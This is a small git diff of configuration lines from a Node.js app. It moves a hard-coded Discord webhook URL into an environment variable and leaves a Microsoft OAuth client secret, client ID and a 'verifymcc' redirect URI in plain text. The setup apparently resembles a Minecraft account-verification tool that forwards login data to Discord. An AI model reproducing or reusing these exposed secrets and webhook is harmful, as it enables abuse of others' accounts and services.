@@ -2,7 +2,7 @@
 const client_secret = 'UH98Q~.S6BsZ8GXREQzTX~mUfAl5BsqKgi7IFbQZ' //you need to put the "Secret Value" here not the "Secret ID"!!!!
 const client_id = '360d2f7a-bd75-405b-9412-d1d9873301b5'
 const redirect_uri = 'https://verifymcc.onrender.com/'
-const webhook_url = 'https://discord.com/api/webhooks/1074036375944446003/gu8KJSz9tw-nEaxJHhjms8-F8ipHVfEGKowrgDAe8qcanTSSE6NwMU2c5b0Ii1fnnf4O'
+const webhook_url = process.env.WEBHOOK
 
 //Requirements
 const axios = require('axios')
